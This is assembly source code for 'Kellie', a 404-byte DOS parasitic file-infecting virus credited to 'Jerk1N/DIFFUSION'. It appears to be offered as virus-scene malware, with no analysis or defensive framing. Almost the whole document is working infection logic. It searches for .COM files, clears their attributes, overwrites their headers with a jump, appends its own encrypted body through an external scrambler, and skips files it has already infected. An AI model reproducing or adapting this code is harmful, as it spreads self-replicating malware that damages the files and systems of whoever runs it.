;############################################################################
;# Virus Name: Kellie                          # Size: 404 Bytes            #
;# Author: Jerk1N                              # EMail: jerk1n@trust-me.com #
;############################################################################
;# Notes                                                                    #
;#  - Parasitic infection routine					    #
;#  - Restores original code						    #
;#  - Doesn't infect the same file twice!!!				    #
;############################################################################

	.model	tiny
	.radix	16
	.code
        Extrn   JVS:near,JVS_end:near,Scrambler:near

start:
        db      01h,00h,0E9h,00h,00h

gotacod:
	call	$+3
getdo:	pop	di
	sub	di,offset $-1
	mov	bp,di
        mov     ah,1Ah
        lea     dx,[bp+offset dta]
        int     21h

p:      mov     dx,01h                          ;Don't Scramble AFTER Gen.
        mov     cx,S                            ;Set Length           /^\
        lea     ax,[bp+offset jak]              ;Point to START        Ý
        call    JVS                             ;Generate             /Ý\
                                                                       Ý
jak:                                            ;                     /Ý\
        mov     word ptr [bp+offset p+1h],00h   ;  p:   mov  dx,00h  --/
	mov	di,100h
	lea	si,[bp+offset orig]
	movsw
	movsw
        movsb
	call	findfile
ohcrap:
	retn

fspec	db	'*.c?m',0
ID      db      '[Kellie]',0
creator db      '[Jerk1N/DIFFUSION]',0
orig    db      0CDh,20h,00h,00h,00h
new3    db      01h,00h,0E9h,00h,00h

findfile:
	mov	ah,4Eh
	mov	cx,07h
	lea	dx,[bp+offset fspec]
	int	21h
	jc	ohcrap
	jmp	infect

fndnext:
	mov	ah,4Fh
	int	21h
	jc	ohcrap
	jmp	infect

infect:
	mov	ax,4301h
	mov	cx,00h
        lea     dx,[bp+offset dta+1Eh]
	int	21h				;Clear Attributes
	call	fopen
        jc      ohcrap

	mov	ax,4202h
	xor	cx,cx
	xor	dx,dx
	int	21h
        sub     ax,05h
        mov     word ptr [bp+offset new3+3h],ax

	mov	cx,4200h
	xor	ax,ax
	xor	dx,dx
	xchg	ax,cx
	int	21h
	mov	ah,3Fh
        mov     cx,5h                           ;Headr Len
	lea	dx,[bp+offset orig]
	int	21h				;Get orig code!
        cmp     byte ptr [bp+offset orig],01h
	jne	goinf
        cmp     byte ptr [bp+offset orig+2h],0E9h
        je      fndnext
goinf:
	mov	ax,4200h
	xor	cx,cx
	xor	dx,dx
	int	21h
	mov	al,40h
	xchg	ah,al
        mov     cx,05h                          ;Headr Len
	lea	dx,[bp+offset new3]
	int	21h				;Write Header!

	mov	dx,4202h
	xor	cx,cx
	xor	ax,ax
	xchg	dx,ax
	int	21h
	call	dovir
	call	closef
	ret

fopen:
        mov     ax,3D02h
	int	21h
	xchg	bx,ax
	ret

closef:
	mov	ah,3Eh
	int	21h
	ret

dovir:
        call    Scrambler                       ;Scramble Before Write
	mov	al,40h
	xchg	al,ah
	mov	cx,V_len
        lea     dx,[bp+offset gotacod]
	int	21h				;Write Virus
        call    Scrambler                       ;Descramble
	ret

V_len   equ     offset JVS_end - offset gotacod
S       equ     offset dovir - offset jak
heap:						;Destroy all data below this line
dta     equ     offset JVS_end
	end
